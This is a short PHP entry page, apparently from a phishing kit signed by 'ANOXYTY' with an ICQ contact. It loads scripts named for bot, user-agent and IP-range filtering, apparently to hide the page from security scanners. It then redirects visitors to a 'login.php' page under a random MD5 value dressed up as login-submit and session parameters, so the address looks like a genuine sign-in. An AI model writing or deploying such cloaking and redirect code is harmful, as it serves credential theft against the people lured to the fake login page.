<?php 
/*       
// made by ANOXYTY" // https://icq.im/Anoxyty "HQ PAGE"
                           ______
        |\_______________ (_____\\______________
HH======#H###############H#######################
        ' ~""""""""""""""`##(_))#H\"""""Y########
                          ))    \#H\       `"Y###
                          "      }#H)
*/
	include 'T3R/bot.php';
	include 'T3R/usera.php';
	include 'T3R/rangip.php';
	$praga=rand();
	$praga=md5($praga);

	header("location: login.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");


?>
